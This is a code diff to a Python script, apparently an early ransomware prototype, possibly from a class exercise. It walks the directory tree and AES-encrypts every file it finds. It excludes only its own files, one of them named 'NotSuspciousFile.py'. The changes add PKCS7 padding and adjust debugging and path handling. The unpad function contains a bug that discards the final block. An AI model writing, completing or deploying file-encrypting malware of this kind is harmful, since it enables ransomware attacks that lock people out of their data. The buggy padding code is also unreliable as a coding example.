@@ -1,6 +1,7 @@
 import os
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
 import base64
 import pdb
 import Constants as const
@@ -19,7 +20,9 @@ def MyEncrypt(file, key):
     #Generate cipher text
     cipher = createCipher(IV, key)
     encryptor = cipher.encryptor()
-    cipher_text = encryptor.update(file) + encryptor.finalize()
+    #pad file to meet requirements
+    padded_file = padFile(file)
+    cipher_text = encryptor.update(padded_file) + encryptor.finalize()
         
     return cipher_text, IV
 
@@ -61,7 +64,19 @@ def encodeFile(file_path):
     with open(file_path, mode='rb') as file:
         encoded_string = base64.b64encode(file.read())
     return encoded_string
-        
+
+def padFile(file):
+    padder = padding.PKCS7(128).padder()
+    pddFile = padder.update(file)
+    pddFile += padder.finalize()
+    return pddFile
+
+def unpadFile(file):
+     unpadder = padding.PKCS7(128).unpadder()
+     data = unpadder.update(file)
+     data + unpadder.finalize()
+     return data
+
 
 def stringify(item_list):
     #Holds all of the decoded items
@@ -96,8 +111,7 @@ if __name__ == '__main__':
     skip_folder = '\__pycache__'
     #Force python to remove these list of items from the root folder directory
     #Because it is our code
-    skip_file_list = list(['NotSuspciousFile.py', 'Constants.py'])
-    pdb.set_trace()
+    skip_file_list = list(['NotSuspciousFile.py', 'Constants.py','Constants.pyc'])
     for root, dirs, files in os.walk('.'):
         #The current folder that we are inspecting
         curr_folder = root.replace('.', '', 1)
@@ -106,15 +120,18 @@ if __name__ == '__main__':
         if(curr_folder == '') :
             files.remove(skip_file_list[0])
             files.remove(skip_file_list[1])
+            files.remove(skip_file_list[2])
         for i in range(len(files)) :
             #file_to_encrypt is the absolute path to the file
-            file_path = curr_path + curr_folder + "\\" + files[i]
+            file_path = curr_path + curr_folder + "/" +files[i]
             #Generate cipher text, IV, Key, and file extension
+            pdb.set_trace()
             cipher_text, IV, key, ext = MyfileEncrypt(file_path);
             cipher_text, IV, key = stringify(list([cipher_text, IV, key]))
             #Generate map
             item_map = {'c' : cipher_text, 'IV' : IV, 'key' : key, 'ext' : ext}
             #Generate Json
             dump = json.dumps(item_map)
+            
             
             
